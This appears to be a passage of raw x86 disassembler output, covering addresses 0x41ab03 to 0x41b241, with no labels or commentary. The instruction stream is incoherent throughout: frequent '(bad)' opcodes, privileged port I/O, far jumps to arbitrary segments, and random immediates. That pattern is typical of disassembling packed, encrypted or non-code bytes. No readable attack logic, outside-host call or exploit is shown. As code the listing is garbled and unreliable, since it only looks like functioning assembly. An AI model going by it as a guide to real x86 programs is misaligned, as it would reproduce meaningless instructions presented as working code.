  41ab03:	dec    ebp
  41ab04:	adc    edx,edi
  41ab06:	or     al,0xbd
  41ab08:	mov    dl,0x42
  41ab0a:	mov    al,ds:0x1a476c1b
  41ab0f:	lods   eax,DWORD PTR ds:[esi]
  41ab10:	pop    ds
  41ab11:	sbb    dl,BYTE PTR [ecx]
  41ab13:	test   BYTE PTR [esi+0x6a],bh
  41ab16:	jl     0x41aaf9
  41ab18:	push   esp
  41ab19:	sub    al,0x20
  41ab1b:	sub    eax,0x9e566f57
  41ab20:	out    dx,eax
  41ab21:	lock (bad) 
  41ab23:	rcl    BYTE PTR [ebx+0x5017cc5d],0x80
  41ab2a:	lock rcl BYTE PTR [edi+0x33],1
  41ab2e:	ret    
  41ab2f:	rol    DWORD PTR ds:0xba225b02,cl
  41ab35:	xor    esp,edx
  41ab37:	push   edi
  41ab38:	call   0x4cf4:0x9f34e9dc
  41ab3f:	sbb    DWORD PTR [edi+0x3990075f],0x68
  41ab46:	dec    ebx
  41ab47:	es cmc 
  41ab49:	xor    DWORD PTR [eax],0x89f6c473
  41ab4f:	and    BYTE PTR [esi],bl
  41ab51:	jle    0x41ab8b
  41ab53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab54:	sahf   
  41ab55:	cdq    
  41ab56:	or     BYTE PTR [ebp+0xa],cl
  41ab59:	aas    
  41ab5a:	mov    ecx,0x9bf4dc6c
  41ab5f:	ins    DWORD PTR es:[edi],dx
  41ab60:	jns    0x41ab06
  41ab62:	shr    edx,1
  41ab64:	mov    cs,ebp
  41ab66:	aad    0x7b
  41ab68:	out    0xc,eax
  41ab6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab6b:	in     al,dx
  41ab6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab6e:	jle    0x41aba6
  41ab70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab71:	xor    bl,BYTE PTR [esi-0x2b]
  41ab74:	mov    ds:0xa79f4a54,al
  41ab79:	pop    ss
  41ab7a:	cdq    
  41ab7b:	pop    esi
  41ab7c:	push   ebp
  41ab7d:	mov    edi,0x64effa43
  41ab82:	mov    dl,BYTE PTR [eax+0x3]
  41ab85:	mov    es,WORD PTR [eax-0xa]
  41ab88:	push   ss
  41ab89:	and    ecx,DWORD PTR [ecx-0x3e]
  41ab8c:	mov    cl,0xe9
  41ab8e:	and    eax,0xc68df92c
  41ab93:	pop    ecx
  41ab94:	jno    0x41abb3
  41ab96:	push   ss
  41ab97:	jo     0x41ab34
  41ab99:	pop    ebp
  41ab9a:	pop    esp
  41ab9b:	cli    
  41ab9c:	fnstsw WORD PTR [ecx-0x4c88b1f1]
  41aba2:	pushf  
  41aba3:	fmul   DWORD PTR [ecx]
  41aba5:	ret    0xe043
  41aba8:	inc    ebx
  41aba9:	(bad)  
  41abaa:	cmc    
  41abab:	ins    DWORD PTR es:[edi],dx
  41abac:	cli    
  41abad:	lods   eax,DWORD PTR ds:[esi]
  41abae:	arpl   WORD PTR [ecx+0x5fc2e644],ax
  41abb4:	mov    ebp,0xe15ad1f
  41abb9:	pop    edi
  41abba:	xchg   BYTE PTR [esi],dl
  41abbc:	fbstp  TBYTE PTR ds:[ebx]
  41abbf:	inc    ecx
  41abc0:	dec    eax
  41abc1:	sbb    al,0x87
  41abc3:	cmp    DWORD PTR [ebp-0x1f7898ce],edx
  41abc9:	add    DWORD PTR [esi+0x6f2d765],0x7b6ccc3d
  41abd3:	jne    0x41abd0
  41abd5:	jnp    0x41abff
  41abd7:	nop
  41abd8:	pop    edi
  41abd9:	js     0x41ac0b
  41abdb:	mov    bl,0xac
  41abdd:	mov    edi,DWORD PTR [eax-0x45]
  41abe0:	jns    0x41ab9e
  41abe2:	retf   0xedf3
  41abe5:	inc    ebp
  41abe6:	sub    eax,0x6a75e5f7
  41abeb:	mov    dl,0xc1
  41abed:	pop    esi
  41abee:	call   0x8b1c:0x6b593d83
  41abf5:	inc    esp
  41abf6:	jbe    0x41abf7
  41abf8:	mov    WORD PTR [edi-0x53cf845],fs
  41abfe:	xchg   esi,eax
  41abff:	xor    eax,DWORD PTR [edx-0x1b]
  41ac02:	mov    al,0xe9
  41ac04:	outs   dx,DWORD PTR ds:[esi]
  41ac05:	addr16 mov al,0xf6
  41ac08:	jae    0x41ac71
  41ac0a:	push   esi
  41ac0b:	shr    BYTE PTR [ecx],cl
  41ac0d:	mov    ebx,0xa3ac4430
  41ac12:	dec    esi
  41ac13:	or     bh,dl
  41ac15:	mov    ds:0x6ba56919,eax
  41ac1a:	inc    ecx
  41ac1b:	inc    edx
  41ac1c:	mov    cl,0x16
  41ac1e:	adc    bl,BYTE PTR [esi+0x6a5a93c9]
  41ac24:	ficomp DWORD PTR [ebp-0x23f26059]
  41ac2a:	sbb    eax,DWORD PTR ds:[esi]
  41ac2d:	jb     0x41ac97
  41ac2f:	mov    al,ds:0x9a10a4f
  41ac34:	cmp    al,0x78
  41ac36:	mov    al,0x70
  41ac38:	mov    WORD PTR [esi+0x5c],es
  41ac3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac3c:	jp     0x41ac4c
  41ac3e:	or     DWORD PTR [edx-0x4],0xc11d0f4
  41ac45:	mov    bh,0xb4
  41ac47:	or     esi,ebx
  41ac49:	dec    edx
  41ac4a:	(bad)  
  41ac4b:	pop    esp
  41ac4c:	sbb    DWORD PTR [ebx],esp
  41ac4e:	push   eax
  41ac4f:	or     DWORD PTR [esi-0x32],0xffffffe7
  41ac53:	push   ss
  41ac54:	add    DWORD PTR [ebx-0x4b6c56c8],esi
  41ac5a:	mov    BYTE PTR [edx+0x33924437],bh
  41ac60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac61:	nop
  41ac62:	nop
  41ac63:	adc    BYTE PTR [ecx-0x34],dl
  41ac66:	sbb    eax,DWORD PTR ds:0xeca5fb08
  41ac6c:	sahf   
  41ac6d:	or     ah,dl
  41ac6f:	lahf   
  41ac70:	sti    
  41ac71:	adc    cl,bh
  41ac73:	adc    al,0xb0
  41ac75:	jo     0x41ac54
  41ac77:	xchg   ebp,eax
  41ac78:	or     dl,0x63
  41ac7b:	(bad)  
  41ac7c:	cli    
  41ac7d:	inc    ecx
  41ac7e:	adc    ebp,DWORD PTR [ebx+0x11]
  41ac81:	retf   
  41ac82:	scas   al,BYTE PTR es:[edi]
  41ac83:	arpl   sp,bx
  41ac85:	leave  
  41ac86:	outs   dx,DWORD PTR ds:[esi]
  41ac87:	sti    
  41ac88:	lods   al,BYTE PTR ds:[esi]
  41ac89:	add    DWORD PTR [esi-0x2ef9fefc],ebx
  41ac8f:	scas   eax,DWORD PTR es:[edi]
  41ac90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac91:	push   ebp
  41ac92:	shl    cl,0x36
  41ac95:	push   edx
  41ac96:	add    ebx,DWORD PTR [ebp-0x5575d864]
  41ac9c:	(bad)  
  41ac9d:	pop    esp
  41ac9e:	mov    bl,0x2e
  41aca0:	jp     0x41ac8e
  41aca2:	ins    BYTE PTR es:[edi],dx
  41aca3:	inc    edx
  41aca5:	add    eax,0x393cc9f5
  41acaa:	fild   WORD PTR [edx+0x4e]
  41acad:	mov    es,WORD PTR [edx]
  41acaf:	test   al,0x45
  41acb1:	or     DWORD PTR [edx],edx
  41acb3:	test   bl,ch
  41acb5:	(bad)  
  41acb6:	aam    0x7f
  41acb8:	cwde   
  41acb9:	mov    esp,0xe2792611
  41acbe:	ret    
  41acbf:	xchg   BYTE PTR [ebx-0x1ec94dcb],cl
  41acc5:	cmp    al,0xed
  41acc7:	push   ebp
  41acc8:	and    ebx,DWORD PTR [esi-0x31]
  41accb:	mov    bh,0x59
  41accd:	fild   DWORD PTR [eax-0x68]
  41acd0:	jb     0x41ad0c
  41acd2:	scas   eax,DWORD PTR es:[edi]
  41acd3:	xchg   edi,eax
  41acd4:	ror    DWORD PTR [edi+0x74],1
  41acd7:	sahf   
  41acd8:	sti    
  41acd9:	xchg   esp,eax
  41acda:	bound  ecx,QWORD PTR [esi-0x68]
  41acdd:	loop   0x41ad36
  41acdf:	and    al,0x3b
  41ace1:	jle    0x41ad56
  41ace3:	wbinvd 
  41ace5:	cmp    eax,0x943899d2
  41acea:	mov    DWORD PTR [ebx-0x259552b7],esp
  41acf0:	das    
  41acf1:	jb     0x41ad1f
  41acf3:	js     0x41ac75
  41acf5:	(bad)  [esp+eiz*8-0x2a66717f]
  41acfc:	or     DWORD PTR [ecx],esp
  41acfe:	popf   
  41acff:	les    ebp,FWORD PTR gs:[eax+0x4]
  41ad03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad04:	movaps xmm2,XMMWORD PTR [edx+0x35a7cd21]
  41ad0b:	loop   0x41ad8b
  41ad0d:	and    esi,esi
  41ad0f:	mul    BYTE PTR [esi]
  41ad11:	mov    bh,BYTE PTR [edx+0x44]
  41ad14:	xchg   DWORD PTR [ebx+0x52],eax
  41ad17:	sar    BYTE PTR [ebp-0x5e],0x26
  41ad1b:	mov    edi,0xb8da1bf5
  41ad20:	mov    BYTE PTR [eax],0x43
  41ad23:	ja     0x41ad7c
  41ad25:	retf   
  41ad26:	sub    eax,0x30ae551
  41ad2b:	fldcw  WORD PTR [edx]
  41ad2d:	dec    ecx
  41ad2e:	sub    BYTE PTR [edx],ch
  41ad30:	sbb    ch,BYTE PTR [edi+0x7c]
  41ad33:	(bad)  
  41ad34:	mov    ds:0xcbfe4fde,eax
  41ad39:	cli    
  41ad3a:	enter  0x74a7,0xf2
  41ad3e:	mov    al,0x4d
  41ad40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad41:	inc    esp
  41ad42:	sbb    esp,DWORD PTR [eax-0x4b61f30d]
  41ad48:	aad    0xd4
  41ad4a:	or     BYTE PTR ds:0xe35dd92a,ch
  41ad50:	jno    0x41ad45
  41ad52:	add    ebx,eax
  41ad54:	jecxz  0x41ad18
  41ad56:	push   0xffffffb6
  41ad58:	jne    0x41ad4d
  41ad5a:	or     DWORD PTR [esi+0x5e182df8],eax
  41ad60:	or     al,0x32
  41ad62:	push   0x6e
  41ad64:	call   ebp
  41ad66:	test   BYTE PTR [esi-0x5bbc91a2],bh
  41ad6c:	aad    0xcd
  41ad6e:	pop    ds
  41ad6f:	iret   
  41ad70:	jmp    0xcb0:0x66468e72
  41ad77:	popa   
  41ad78:	mov    esi,DWORD PTR [ebp+0x71]
  41ad7b:	jmp    0x41ad81
  41ad7d:	daa    
  41ad7e:	jmp    0x6d9a:0x890d25ad
  41ad85:	fiadd  DWORD PTR [edi-0x5b]
  41ad88:	inc    esi
  41ad89:	sbb    ah,bh
  41ad8b:	sar    DWORD PTR [eax+0x75],0xc5
  41ad8f:	push   0x72
  41ad91:	adc    eax,0x3dca7d64
  41ad96:	pop    ebx
  41ad97:	sbb    eax,0x4df569a5
  41ad9c:	cdq    
  41ad9d:	xchg   esi,eax
  41ad9e:	in     al,0xca
  41ada0:	adc    eax,0xa39bdac9
  41ada5:	and    cl,BYTE PTR [esi+0x66]
  41ada8:	pop    esi
  41ada9:	dec    edx
  41adaa:	push   0xffffffee
  41adac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adad:	nop
  41adae:	xchg   BYTE PTR [edi],bl
  41adb0:	dec    ebp
  41adb1:	aas    
  41adb2:	sbb    al,0x25
  41adb4:	dec    eax
  41adb5:	mov    BYTE PTR [edx-0x3a],cl
  41adb8:	adc    eax,0x96efb7f
  41adbd:	in     eax,0x2
  41adbf:	lock cs xor eax,0xd8cfe96
  41adc6:	mov    cl,0xf2
  41adc8:	loop   0x41ad78
  41adca:	loopne 0x41ae2f
  41adcc:	std    
  41adcd:	dec    eax
  41adce:	ja     0x41ae45
  41add0:	das    
  41add1:	rol    DWORD PTR [ebp+0x6e15865],1
  41add7:	test   BYTE PTR [eax+0x546ca28e],bh
  41addd:	jnp    0x41ae56
  41addf:	frstor [esi+ebx*1-0x5]
  41ade3:	adc    esi,ecx
  41ade5:	(bad)  
  41ade6:	mov    ecx,0xc5146a75
  41adeb:	and    eax,0x3082bee9
  41adf0:	dec    ecx
  41adf1:	jmp    0x41adf7
  41adf3:	ret    0xeaf1
  41adf6:	jae    0x41ad92
  41adf8:	mov    bh,0xb4
  41adfa:	shl    ch,0xbe
  41adfd:	es js  0x41ae4e
  41ae00:	std    
  41ae01:	out    0x5f,eax
  41ae03:	out    0x9b,al
  41ae05:	mov    edx,0xa78b1404
  41ae0a:	lahf   
  41ae0b:	cwde   
  41ae0c:	fwait
  41ae0d:	inc    esi
  41ae0e:	out    0x44,al
  41ae10:	xchg   BYTE PTR [ebx-0x2717d6cd],al
  41ae16:	fst    QWORD PTR [edx-0x49]
  41ae19:	adc    edi,0x26cab626
  41ae1f:	and    DWORD PTR [esi-0xc],eax
  41ae22:	push   ebp
  41ae23:	xchg   edx,eax
  41ae24:	jl     0x41ada8
  41ae26:	lock inc edi
  41ae28:	push   ebx
  41ae29:	test   DWORD PTR [edi],ecx
  41ae2b:	(bad)  
  41ae2c:	in     al,dx
  41ae2d:	sbb    DWORD PTR [eax+ebx*4+0x78f223c0],edx
  41ae34:	popf   
  41ae35:	xor    ebx,0xe5ca2c7
  41ae3b:	gs cwde 
  41ae3d:	adc    dh,BYTE PTR [edx]
  41ae3f:	xlat   BYTE PTR ds:[ebx]
  41ae40:	aas    
  41ae41:	sbb    al,BYTE PTR [esi+0x10]
  41ae44:	mov    ebx,DWORD PTR [edi-0x57]
  41ae47:	cli    
  41ae48:	sti    
  41ae49:	push   es
  41ae4a:	mov    bl,0xf3
  41ae4c:	dec    edx
  41ae4d:	call   0x13c4b426
  41ae52:	xchg   edi,eax
  41ae53:	test   BYTE PTR [esi],al
  41ae55:	outs   dx,BYTE PTR ds:[esi]
  41ae56:	addr16 dec eax
  41ae58:	sub    al,0x63
  41ae5a:	or     ch,ch
  41ae5c:	out    0x43,eax
  41ae5e:	nop
  41ae5f:	(bad)  
  41ae61:	add    DWORD PTR [ebx+ebp*1-0x33],ecx
  41ae65:	or     DWORD PTR [esi+0xe90651],ebx
  41ae6b:	push   esp
  41ae6c:	ss (bad) 
  41ae6e:	leave  
  41ae6f:	or     ch,BYTE PTR [ecx+0xd]
  41ae72:	xor    DWORD PTR [ebx-0x72],edx
  41ae75:	jge    0x41aeaa
  41ae77:	jge    0x41aee5
  41ae79:	retf   
  41ae7a:	and    ebp,edx
  41ae7c:	add    al,bh
  41ae7e:	arpl   dx,si
  41ae80:	ins    BYTE PTR es:[edi],dx
  41ae81:	adc    al,0xa9
  41ae83:	test   DWORD PTR [ecx+0x3381c5d1],ecx
  41ae89:	fidivr DWORD PTR [ebx-0x7901c484]
  41ae8f:	mov    ebp,0x4ca37809
  41ae94:	fisttp WORD PTR [esi-0x13]
  41ae97:	adc    BYTE PTR [ebp+0x6c200e2f],ah
  41ae9d:	add    eax,0xcd77d276
  41aea2:	sub    ecx,DWORD PTR [eax+0x4ef8f5e9]
  41aea8:	retf   0xc2af
  41aeab:	dec    edi
  41aeac:	loope  0x41af16
  41aeae:	and    DWORD PTR [ebp+0x7120532d],eax
  41aeb4:	into   
  41aeb5:	mov    edx,0x5e39e199
  41aeba:	push   ebp
  41aebb:	aad    0x54
  41aebd:	mov    ebx,DWORD PTR [eax]
  41aebf:	js     0x41ae7c
  41aec1:	les    ebx,FWORD PTR [ebx+edx*4]
  41aec4:	xchg   edi,eax
  41aec5:	or     BYTE PTR [ebx-0x6b491329],dh
  41aecb:	sub    BYTE PTR [ebx+0x20],al
  41aece:	lods   al,BYTE PTR ds:[esi]
  41aecf:	dec    esi
  41aed0:	int3   
  41aed1:	mov    ebp,0x30b72e70
  41aed6:	std    
  41aed7:	and    eax,ebx
  41aed9:	pop    esp
  41aeda:	adc    ebp,esi
  41aedc:	js     0x41ae7f
  41aede:	repz leave 
  41aee0:	xchg   esi,eax
  41aee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aee2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aee3:	push   edi
  41aee4:	(bad)
  41aee9:	mov    al,ds:0xcfa08732
  41aeee:	mov    ch,0x21
  41aef0:	(bad)  
  41aef1:	xchg   edx,eax
  41aef2:	push   cs
  41aef3:	ret    
  41aef4:	and    esi,DWORD PTR [ecx+0x576b545]
  41aefa:	imul   esp,DWORD PTR [ecx+0x251a7994],0x4e4ca75
  41af04:	ficom  WORD PTR [edx-0x1d18ddd6]
  41af0a:	add    BYTE PTR [ebp+0x30],dh
  41af0d:	adc    ebx,DWORD PTR [edi-0x2d7cd1bf]
  41af13:	mov    DWORD PTR [esi+0x56470454],esp
  41af19:	cs aad 0x58
  41af1c:	lock mov al,0xc0
  41af1f:	popf   
  41af20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af21:	mov    ?,WORD PTR [edi]
  41af23:	sbb    BYTE PTR [ebx-0x4892a532],bh
  41af29:	xchg   DWORD PTR [esi],esp
  41af2b:	inc    eax
  41af2c:	pop    edx
  41af2d:	(bad)  
  41af2f:	loope  0x41afa5
  41af31:	fldenv [ecx+0x3a66a349]
  41af37:	mov    esp,0x65a63c53
  41af3c:	dec    esp
  41af3d:	xchg   esi,eax
  41af3e:	out    0xbf,eax
  41af40:	dec    ecx
  41af41:	push   0x3ac1092f
  41af46:	test   al,0xd9
  41af48:	push   eax
  41af49:	aad    0xdb
  41af4b:	mov    esp,0x5291ff02
  41af50:	call   0x507e:0x24b3511d
  41af57:	mov    ebx,0x3c6e50a8
  41af5c:	add    al,0xd6
  41af5e:	mov    BYTE PTR [esp+edi*4-0x4cbde3c4],ah
  41af65:	and    al,BYTE PTR [eax-0x5b9be7e4]
  41af6b:	or     DWORD PTR [ecx+eax*8],edx
  41af6e:	lods   al,BYTE PTR ds:[esi]
  41af6f:	pop    esi
  41af70:	push   esi
  41af71:	xchg   BYTE PTR [edi+0x64313e88],bh
  41af77:	mov    ebx,0x977ece31
  41af7c:	(bad)  
  41af7d:	sbb    BYTE PTR [ebp-0x1dcf0464],bl
  41af83:	outs   dx,DWORD PTR ds:[esi]
  41af84:	mov    dl,0x9f
  41af86:	or     ebp,ecx
  41af88:	cmp    al,0xff
  41af8a:	fadd   QWORD PTR [ebx+ebp*2-0x38]
  41af8e:	xchg   edx,eax
  41af8f:	jle    0x41af99
  41af91:	lods   al,BYTE PTR ds:[esi]
  41af92:	jb     0x41af72
  41af94:	addr16 (bad) 
  41af97:	jmp    0x4b2a:0x428b233d
  41af9e:	lahf   
  41af9f:	adc    DWORD PTR [ebp-0x203287d1],edx
  41afa5:	push   ds
  41afa6:	sahf   
  41afa7:	pusha  
  41afa8:	add    BYTE PTR [ecx+0xb52c5fa],dh
  41afae:	stc    
  41afaf:	daa    
  41afb0:	mov    ebp,0xe8d6689c
  41afb5:	inc    eax
  41afb6:	loop   0x41af48
  41afb8:	xor    DWORD PTR [esi-0x54],ecx
  41afbb:	add    ecx,esp
  41afbd:	mov    dh,0xc5
  41afbf:	shr    dh,0x94
  41afc2:	pop    ss
  41afc3:	push   cs
  41afc4:	(bad)  
  41afc5:	jne    0x41af59
  41afc7:	adc    al,0xd8
  41afc9:	adc    eax,0xb39fe60f
  41afce:	mov    edi,ebp
  41afd0:	neg    ch
  41afd2:	or     ch,BYTE PTR [esi-0x36096e44]
  41afd8:	cmp    ch,BYTE PTR [ecx+0x7396655c]
  41afde:	pop    ss
  41afdf:	xchg   edi,eax
  41afe0:	loopne 0x41b01d
  41afe2:	and    esi,ecx
  41afe4:	std    
  41afe5:	aaa    
  41afe6:	outs   dx,BYTE PTR ds:[esi]
  41afe7:	mov    al,ds:0x966c771c
  41afec:	in     al,0x61
  41afee:	sar    BYTE PTR [ecx+0x4b941a81],cl
  41aff4:	pusha  
  41aff5:	xchg   BYTE PTR [edi],al
  41aff7:	and    ch,BYTE PTR [ebx]
  41aff9:	bound  esp,QWORD PTR [esi+edi*8-0x19a3cb6b]
  41b000:	xlat   BYTE PTR ds:[ebx]
  41b001:	retf   0x1645
  41b004:	mov    ch,0x68
  41b006:	or     al,0xc4
  41b008:	add    DWORD PTR [eax-0x5a],ebx
  41b00b:	call   0xb3a92623
  41b010:	inc    esi
  41b011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b012:	sub    BYTE PTR [edi-0x80],0x1f
  41b016:	mov    bh,0xe2
  41b018:	and    edi,eax
  41b01a:	jb     0x41b080
  41b01c:	test   eax,0xa634691d
  41b021:	pop    eax
  41b022:	push   ebp
  41b023:	dec    eax
  41b024:	jns    0x41b046
  41b026:	dec    eax
  41b027:	jmp    0x41b01c
  41b029:	push   ebx
  41b02a:	int3   
  41b02b:	shl    ebx,0x55
  41b02e:	mov    ecx,0xa93c06ce
  41b033:	pop    edx
  41b034:	jmp    0x89e9:0x751771dd
  41b03b:	cmp    bl,BYTE PTR [ecx]
  41b03d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b03e:	sub    ebx,DWORD PTR [ebx+0x4b]
  41b041:	jnp    0x41b0b4
  41b043:	lods   eax,DWORD PTR ds:[esi]
  41b044:	inc    ebp
  41b045:	pop    ecx
  41b046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b047:	cdq    
  41b048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b049:	adc    al,BYTE PTR [esi-0x20653fe0]
  41b04f:	mov    ds:0xb0d53d6f,eax
  41b054:	clc    
  41b055:	arpl   dx,ax
  41b057:	jno    0x41b019
  41b059:	push   ebx
  41b05a:	cld    
  41b05b:	cmp    BYTE PTR ds:0x1866ba45,0xd1
  41b062:	test   eax,0x99a9233e
  41b067:	pop    ebx
  41b068:	popf   
  41b069:	leave  
  41b06a:	neg    DWORD PTR [ebx-0x526cf4a9]
  41b070:	cmp    eax,0xa7b0ccaf
  41b075:	loop   0x41b051
  41b077:	or     al,0xa3
  41b079:	dec    ebp
  41b07a:	jne    0x41b0af
  41b07c:	mov    DWORD PTR ds:0x29424b96,edx
  41b082:	stc    
  41b083:	addr16 add ecx,esp
  41b086:	test   eax,0xc1b6b392
  41b08b:	ja     0x41b0c2
  41b08d:	lock repz sbb dl,bh
  41b091:	out    dx,eax
  41b092:	test   BYTE PTR [ecx],dh
  41b094:	fdiv   QWORD PTR [eax+0x67ac85b9]
  41b09a:	xchg   esp,eax
  41b09b:	neg    BYTE PTR [ebx]
  41b09d:	push   edi
  41b09e:	(bad)  
  41b09f:	xlat   BYTE PTR ds:[ebx]
  41b0a0:	jae    0x41b063
  41b0a2:	neg    ecx
  41b0a4:	outs   dx,DWORD PTR ds:[esi]
  41b0a5:	add    BYTE PTR [ebx+0x1c],ch
  41b0a8:	mov    eax,ds:0x1d663047
  41b0ad:	xchg   ebx,eax
  41b0ae:	sbb    BYTE PTR [esi+0x36],bh
  41b0b1:	cs leave 
  41b0b3:	xchg   esp,eax
  41b0b4:	(bad)  [ebp+0x330f0eb9]
  41b0ba:	sub    eax,0x547c5310
  41b0bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0c0:	dec    esp
  41b0c1:	sub    dl,0x13
  41b0c4:	(bad)  
  41b0c5:	int3   
  41b0c6:	in     eax,dx
  41b0c7:	cmp    eax,0xf05ab002
  41b0cc:	push   ebp
  41b0cd:	pop    es
  41b0ce:	ret    
  41b0cf:	test   eax,0x8d7616b
  41b0d4:	rol    BYTE PTR [ebx-0x54],cl
  41b0d7:	cmp    eax,0xeeaff0c8
  41b0dc:	lds    ebx,FWORD PTR [ebx]
  41b0de:	dec    BYTE PTR [esi]
  41b0e0:	push   edi
  41b0e1:	in     eax,dx
  41b0e2:	sub    bh,BYTE PTR [edx+0x2e6b3a46]
  41b0e8:	gs cmc 
  41b0ea:	fbld   TBYTE PTR [eax+0x34d1f8d3]
  41b0f0:	xchg   BYTE PTR [esp+edi*4-0x35],dh
  41b0f4:	aam    0x5d
  41b0f6:	pop    ss
  41b0f7:	mov    ah,0x65
  41b0f9:	jmp    0x41b0fb
  41b0fb:	sbb    al,0xe
  41b0fd:	mov    al,cl
  41b0ff:	push   esp
  41b100:	xchg   ebx,eax
  41b101:	(bad)  
  41b102:	aam    0x6f
  41b104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b105:	cli    
  41b106:	sbb    DWORD PTR [ebx+0x1],esi
  41b109:	cwde   
  41b10a:	lods   eax,DWORD PTR ds:[esi]
  41b10b:	push   ebp
  41b10c:	ins    BYTE PTR es:[edi],dx
  41b10d:	xchg   ecx,eax
  41b10e:	clc    
  41b10f:	(bad)  
  41b110:	push   esp
  41b111:	xchg   dh,dh
  41b113:	les    ebp,FWORD PTR [ebx-0x68]
  41b116:	fimul  DWORD PTR [ecx]
  41b118:	jl     0x41b0c5
  41b11a:	adc    eax,0xdcc4b163
  41b11f:	dec    edx
  41b120:	cmp    BYTE PTR [edx-0x17],bl
  41b123:	xchg   edx,eax
  41b124:	ins    BYTE PTR es:[edi],dx
  41b125:	ds icebp 
  41b127:	ss sbb dl,dl
  41b12a:	das    
  41b12b:	cli    
  41b12c:	rcr    ebp,cl
  41b12e:	add    ecx,DWORD PTR ds:0x28aa5874
  41b134:	lods   al,BYTE PTR ds:[esi]
  41b135:	cld    
  41b136:	fsub   QWORD PTR [ebx]
  41b138:	scas   eax,DWORD PTR es:[edi]
  41b139:	push   0xffffff8d
  41b13b:	(bad)  
  41b13c:	mov    eax,ds:0xae0860d5
  41b141:	fidivr DWORD PTR ds:0xd6df5e11
  41b147:	jnp    0x41b1ae
  41b149:	(bad)  
  41b14a:	ficomp WORD PTR [ecx+0x1a539d4b]
  41b150:	retf   0x6dc8
  41b153:	dec    ebp
  41b154:	jmp    0xb6d52134
  41b159:	push   edx
  41b15a:	scas   al,BYTE PTR es:[edi]
  41b15b:	mov    eax,ds:0x9807e811
  41b160:	rcr    eax,cl
  41b162:	loop   0x41b10f
  41b164:	stc    
  41b165:	xchg   ecx,eax
  41b166:	(bad)  
  41b167:	adc    BYTE PTR [edx],cl
  41b169:	mov    edi,0x80f53390
  41b16e:	mov    ebp,0xc7b00424
  41b173:	outs   dx,DWORD PTR ds:[esi]
  41b174:	(bad)  
  41b175:	call   0x73dff477
  41b17a:	sbb    edx,edx
  41b17c:	mov    esi,0x9b94523e
  41b181:	repnz inc ecx
  41b183:	loop   0x41b15e
  41b185:	inc    ecx
  41b186:	in     eax,dx
  41b187:	and    bl,BYTE PTR [edi-0x12e5ce8c]
  41b18d:	gs ret 0xc490
  41b191:	aaa    
  41b192:	stc    
  41b193:	(bad)  
  41b194:	(bad)  
  41b196:	xchg   edx,eax
  41b197:	dec    eax
  41b198:	das    
  41b199:	call   0x1cb379e1
  41b19e:	xchg   ebp,eax
  41b19f:	mov    BYTE PTR [esi],dh
  41b1a1:	in     al,dx
  41b1a2:	xchg   ebx,eax
  41b1a3:	xor    DWORD PTR [edx+eax*1+0x72],eax
  41b1a7:	pop    ss
  41b1a8:	std    
  41b1a9:	mov    ds:0x49417dd4,al
  41b1ae:	jl     0x41b1fe
  41b1b0:	std    
  41b1b1:	dec    ebx
  41b1b2:	out    dx,eax
  41b1b3:	mov    ebp,0x491c115a
  41b1b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1b9:	aam    0x8b
  41b1bb:	shr    DWORD PTR [edi-0x46],cl
  41b1be:	lods   al,BYTE PTR ds:[esi]
  41b1bf:	scas   al,BYTE PTR es:[edi]
  41b1c0:	test   BYTE PTR [esi+0x603441bc],dl
  41b1c6:	aas    
  41b1c7:	sbb    al,BYTE PTR ds:0xfe10af42
  41b1cd:	lahf   
  41b1ce:	fadd   st(6),st
  41b1d0:	imul   eax,DWORD PTR [esi],0xd7919b24
  41b1d6:	test   BYTE PTR [eax],dh
  41b1d8:	jl     0x41b182
  41b1da:	out    dx,al
  41b1db:	pushf  
  41b1dc:	mov    esi,0x15f1163c
  41b1e1:	mov    bl,0xf5
  41b1e3:	xchg   ebp,eax
  41b1e4:	xor    al,0x1a
  41b1e6:	inc    esi
  41b1e8:	xor    edx,DWORD PTR ds:0xe32028b2
  41b1ee:	cmp    DWORD PTR [ebx+0x27a216a9],ebx
  41b1f4:	retf   0x43b1
  41b1f7:	mov    dl,0xd7
  41b1f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1fa:	jbe    0x41b276
  41b1fc:	sub    bh,dl
  41b1fe:	ins    BYTE PTR es:[edi],dx
  41b1ff:	mov    BYTE PTR [ecx],cl
  41b201:	into   
  41b202:	mov    bh,0xe6
  41b204:	jge    0x41b1d0
  41b206:	cmp    ch,bl
  41b208:	addr16 cmp al,0x59
  41b20b:	rol    BYTE PTR [esi+0x7c],1
  41b20e:	pop    esi
  41b20f:	das    
  41b210:	sbb    al,0xde
  41b212:	mov    ds:0xaed2c52e,eax
  41b217:	xchg   esp,eax
  41b218:	or     ebp,DWORD PTR [ebx+0x7f45f46f]
  41b21e:	or     al,0xc5
  41b220:	stos   DWORD PTR es:[edi],eax
  41b221:	jns    0x41b29d
  41b223:	mov    eax,0xbd859f09
  41b228:	daa    
  41b229:	jp     0x41b209
  41b22b:	lahf   
  41b22c:	out    dx,eax
  41b22d:	xchg   edx,eax
  41b22e:	mov    esi,0xcc4fbe0
  41b233:	pop    ebx
  41b234:	mov    ebp,0xb37dc65e
  41b239:	js     0x41b1dd
  41b23b:	inc    esi
  41b23c:	adc    ecx,DWORD PTR [esi-0x44]
  41b23f:	jne    0x41b2ad
  41b241:	fs (bad) 
